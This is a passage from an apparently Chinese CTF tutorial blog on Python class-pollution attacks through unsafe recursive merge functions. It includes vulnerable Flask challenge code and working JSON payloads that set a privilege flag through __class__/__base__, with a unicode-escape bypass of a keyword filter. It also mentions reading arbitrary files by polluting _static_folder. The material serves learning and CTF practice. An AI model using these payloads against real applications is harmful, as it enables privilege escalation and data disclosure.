class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>merge(payload, instance)</strong></p>
+<p>在这里，我们自行控制的payload作为src传入merge函数，目标实例instance作为dst传入，并且将payload对应的k和v的值取了出来</p>
+<p>我们先讲一下merge的执行步骤:</p>
+<ul>
+<li><strong>遍历payload</strong></li>
+</ul>
+<p>第一次循环时:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = &quot;__class__&quot; v = &quot;&quot;__base__&quot; : &#123;&quot;secret&quot; : &quot;world&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后会检查instance中是否有__getitem__方法,因为instance是实例不是字典，所以返回为false，进入elif判断，检查instance中是否有<code>__class__</code>属性和v是否为字典(因为instance是对象类型，并且含有__class__默认属性，并且v也为字典格式，故执行这条判断语句)</p>
+<ul>
+<li><strong>递归合并</strong></li>
+</ul>
+<p><code>merge(v, getattr(dst, k))</code> 的作用是将一个字典 <code>v</code> 的内容合并到目标对象 <code>dst</code> 的属性 <code>k</code> 中。<code>getattr(dst, k)</code> 用于获取 <code>dst</code> 对象中的属性 <code>k</code>。如果 <code>k</code> 是一个字符串，<code>getattr</code> 将返回 <code>dst</code> 对象中名为 <code>k</code> 的属性的值。</p>
+<p>第一次递归</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;</span></span><br><span class="line"><span class="string">        &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="string">            &quot;secret&quot; : &quot;world&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">dst=son_b()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二次递归</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;&quot;secret&quot; : &quot;world&quot;&#125;</span></span><br><span class="line"><span class="string">dst=father()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第三次递归，<strong>type(v) &#x3D;&#x3D; dict</strong>为FALSE，递归结束，此时<strong>v&#x3D;“world”</strong>,不再是字典类型，然后执行语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setattr(dst, k, v)</span><br></pre></td></tr></table></figure>
+
+<p>重置<strong>father类</strong>中的<strong>secret</strong>属性的值为<strong>world</strong>，到此简单的链污染已经完成</p>
+<p>上面的就是一个简单的python原型链污染，在这个例子中创建的对象instance对应的son_b类是存在父类的，但很多时候是没有父类的，此时就可以利用python的一些属性来寻找对应变量</p>
+<p>但是上面的是对象属性son.b()，但是并不是所有的类属性都可以被污染，而是要求我们的目标类可以被切入点类或对象可以通过属性值查找获取到</p>
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><ul>
+<li>unicode绕过，但取决于是否有json.loads函数处理json数据</li>
+</ul>
+<h2 id="攻击姿势"><a href="#攻击姿势" class="headerlink" title="攻击姿势"></a>攻击姿势</h2><p>污染<code>_static_folder</code>实现任意文件读取，将该配置指向根目录，从而可以读取根目录上开始的任意文件</p>
+<h2 id="试题题目"><a href="#试题题目" class="headerlink" title="试题题目"></a>试题题目</h2><h3 id="GeekChallenge2023-ezpython"><a href="#GeekChallenge2023-ezpython" class="headerlink" title="[GeekChallenge2023]ezpython"></a>[GeekChallenge2023]ezpython</h3><p>第十四届极客大挑战的题</p>
+<p>考点:python原型链污染</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.isvip=<span class="literal">False</span></span><br><span class="line"><span class="comment">#定义了一个User类，包括三个属性，并通过init初始化方法去设置三个属性的值，其中isVip的值为false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#定义了一个子类hhh去继承上面的父类，但是这里只有两个属性</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"><span class="comment">#通过一个装饰器去定义一个路由，/表示根路径，这里定义了一个hello_word函数，负责返回渲染文件并将其渲染为响应</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"><span class="comment">#在session会话中把username的值赋值给username，若username存在，则使用 render_template 渲染 index.html 模板，并将 username 作为 name 变量传递给模板。这使得在模板中可以使用 &#123;&#123; name &#125;&#125; 来显示用户名。不存在则重定向到登录界面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"><span class="comment">#定义一个登录的函数，并设定请求方式为POST，从请求表单中获取username和password并查找是否存在匹配的用户，若存在则将username和password存储在session中，并重定向到/play界面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;连用户名密码都没有你注册啥呢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;泰酷辣,没有注册成功捏&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"><span class="comment">#包含waf的注册函数，处理登录的信息，如果注册成功则会重定向到登录界面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line"><span class="comment">#使用生成器表达式和 next() 函数查找当前会话中的用户。如果找到了匹配的用户，则将其赋值给 user，否则将为 None。</span></span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">    <span class="comment">#需要成功登录且登录用户为vip用户</span></span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="comment">#从查询字符串中获取num参数</span></span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                    <span class="comment">#data不能有0，能为字符串&quot;123456789&quot;但是需要转化为整数后是123456789，且长度不超过10</span></span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                    <span class="comment">#获取flag的值并渲染到flag.html中</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;你的数字不对哦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;先登录去&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的话看到merge的第一思路就是原型链污染，然后我们讲一下这道题的思路</p>
+<p>我们需要注册一个用户和密码，然后进行登录，登录成功后我们的用户名和密码会被存储在session中，在&#x2F;flag路由中会检测session中是否含有我们的用户名和密码，并判断我们的用户是否是vip用户，所以这里我们需要污染的值就是我们的isVip值，将其值设置为true，这样可以通过验证，然后我们需要设置我们的num的值，绕过判断后就能拿到flag</p>
+<p>所以我们的payload直接用postman或者用bp发送(借一张图进行示范)</p>
+<p><img src="/./../image/achieve/202411/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3167109-20231127220702292-213744840.png" alt="img"></p>
+<p>（<code>__base__</code>是为了指向父类user的isvip从而污染）</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__base__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;isvip&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为isvip被过滤了，所以我们要用unicode编码来绕过\u0069\u0073\u0076\u0069\u0070</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;qetx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__base__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">             <span class="attr">&quot;\u0069\u0073\u0076\u0069\u0070&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="comment">//”isvip“:true</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这边要注意几个点，首先使用post发包，其次Content-Type: application&#x2F;json，最后发送的post内容要符合json格式，可以发现注册成功，接下来先登录一下&#x2F;login然后接着去访问&#x2F;flag的路由，用get方法传入一个num&#x3D;+123456789</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag?num=+123456789</span><br></pre></td></tr></table></figure>
+
+<p>执行之后查看源代码就可以得到flag了</p>
+<p><img src="/./../image/achieve/202411/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3167109-20231127220756895-1817807341.png" alt="img"></p>
+<h3 id="DSACTF2023七月暑期赛–EzFlask"><a href="#DSACTF2023七月暑期赛–EzFlask" class="headerlink" title="DSACTF2023七月暑期赛–EzFlask"></a>DSACTF2023七月暑期赛–EzFlask</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import uuid </span><br><span class="line"><span class="keyword">from</span> flask import Flask, request, session </span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">black_list = [<span class="string">&quot;__init__&quot;</span>.<span class="title function_ invoke__">encode</span>(),<span class="string">&quot;__globals__&quot;</span>.<span class="title function_ invoke__">encode</span>()]</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__) </span><br><span class="line">app.secret_key = <span class="title function_ invoke__">str</span>(uuid.<span class="title function_ invoke__">uuid4</span>()) </span><br><span class="line">def <span class="title function_ invoke__">check</span>(data): </span><br><span class="line">    <span class="keyword">for</span> i in black_list:</span><br><span class="line">        <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i in data: </span><br><span class="line">            <span class="keyword">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> False </span><br><span class="line">    <span class="keyword">return</span> True </span><br><span class="line">        </span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst): </span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>(): </span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>): </span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict: </span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k)) </span><br><span class="line">            <span class="keyword">else</span>: dst[k] = v </span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict: </span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k)) </span><br><span class="line">        <span class="keyword">else</span>: <span class="title function_ invoke__">setattr</span>(dst, k, v) </span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span>(): </span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>): </span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">username</span> = &quot;&quot; </span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">password</span> = &quot;&quot; </span></span><br><span class="line"><span class="class">        <span class="title">pass</span> </span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">check</span>(<span class="title">self</span>, <span class="title">data</span>): </span></span><br><span class="line"><span class="class">        <span class="title">if</span> <span class="title">self</span>.<span class="title">username</span> == <span class="title">data</span>[&#x27;<span class="title">username</span>&#x27;] <span class="title">and</span> <span class="title">self</span>.<span class="title">password</span> == <span class="title">data</span>[&#x27;<span class="title">password</span>&#x27;]: </span></span><br><span class="line"><span class="class">            <span class="title">return</span> <span class="title">True</span> </span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">False</span> </span></span><br><span class="line"><span class="class">#定义了一个<span class="title">user</span>类并包括两个方法，一个是<span class="title">init</span>初始化方法，一个是<span class="title">check</span>检查函数，检查我们的<span class="title">username</span>和<span class="title">password</span>是否与<span class="title">data</span>字典中相匹配</span></span><br><span class="line"><span class="class"><span class="title">Users</span> = [] </span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/<span class="title">register</span>&#x27;,<span class="title">methods</span>=[&#x27;<span class="title">POST</span>&#x27;]) </span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">register</span>(): </span></span><br><span class="line"><span class="class">    <span class="title">if</span> <span class="title">request</span>.<span class="title">data</span>: #检查是否包含数据</span></span><br><span class="line"><span class="class">        <span class="title">try</span>: </span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">request</span>.<span class="title">data</span>)</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">json</span>.<span class="title">loads</span>(<span class="title">request</span>.<span class="title">data</span>))</span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">not</span> <span class="title">check</span>(<span class="title">request</span>.<span class="title">data</span>):</span></span><br><span class="line"><span class="class">                <span class="title">print</span>(&quot;<span class="title">No</span> <span class="title">check</span>&quot;)</span></span><br><span class="line"><span class="class">                <span class="title">return</span> &quot;<span class="title">Register</span> <span class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class">            <span class="title">data</span> = <span class="title">json</span>.<span class="title">loads</span>(<span class="title">request</span>.<span class="title">data</span>)</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">data</span>)</span></span><br><span class="line"><span class="class">            <span class="title">if</span> &quot;<span class="title">username</span>&quot; <span class="title">not</span> <span class="title">in</span> <span class="title">data</span> <span class="title">or</span> &quot;<span class="title">password</span>&quot; <span class="title">not</span> <span class="title">in</span> <span class="title">data</span>: </span></span><br><span class="line"><span class="class">                <span class="title">print</span>(&quot;<span class="title">no</span> <span class="title">username</span> <span class="title">or</span> <span class="title">passwd</span>&quot;)</span></span><br><span class="line"><span class="class">                <span class="title">return</span> &quot;<span class="title">Register</span> <span class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class">            <span class="title">User</span> = <span class="title">user</span>() </span></span><br><span class="line"><span class="class">            <span class="title">merge</span>(<span class="title">data</span>, <span class="title">User</span>) </span></span><br><span class="line"><span class="class">            <span class="title">Users</span>.<span class="title">append</span>(<span class="title">User</span>) </span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>: </span></span><br><span class="line"><span class="class">            <span class="title">print</span>(&quot;<span class="title">Exception</span>: &quot;,<span class="title">e</span>)</span></span><br><span class="line"><span class="class">            <span class="title">return</span> &quot;<span class="title">Register</span> <span class="title">Failed</span>&quot;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">Register</span> <span class="title">Success</span>&quot; </span></span><br><span class="line"><span class="class">    <span class="title">else</span>: </span></span><br><span class="line"><span class="class">        <span class="title">print</span>(&quot;<span class="title">no</span> <span class="title">data</span>&quot;)</span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">Register</span> <span 